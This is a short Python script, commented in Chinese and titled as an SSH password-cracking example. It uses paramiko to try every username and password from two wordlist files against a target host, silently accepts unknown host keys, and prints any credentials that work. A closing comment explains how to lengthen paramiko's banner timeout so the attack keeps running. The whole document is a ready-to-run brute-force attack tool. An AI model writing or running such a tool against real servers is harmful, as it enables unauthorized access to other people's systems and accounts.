'''ssh密码破解案例'''
import paramiko
import sys

def brute_ssh(hostname,userFile,passFile):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy) #加上这句话不用担心选yes的问题，会自动选上（用ssh连接远程主机时，第一次连接时会提示是否继续进行远程连接，选择yes）
    with open(userFile,'r') as u_f:
        with open(passFile,'r') as p_f:
            userList = u_f.readlines()
            pwdList = p_f.readlines()
            for user in userList:
                for pwd in pwdList:
                    try:
                        print("尝试\r\n"+user+pwd)
                        client.connect(hostname,username=user.strip(),password=pwd.strip())
                        print("success:"+user+"---"+pwd)
                        return True
                    except:
                        pass
            print('破解失败')
            return False

brute_ssh(sys.argv[1],sys.argv[2],sys.argv[3])

'''
可能会产生的异常：Exception: Error reading SSH protocol banner
原因1：这个错误出现在服务器接受连接但是ssh守护进程没有及时响应的情况（一般是15s）.
要解决这个问题， 需要将paramiko的响应等待时间调长。 
修改paramiko/transport.py文件中的self.banner_timeout值， 将其设为300或者其他较长的值即可解决这个问题。
原因2：已经尝试链接成功过了，后又继续尝试链接
'''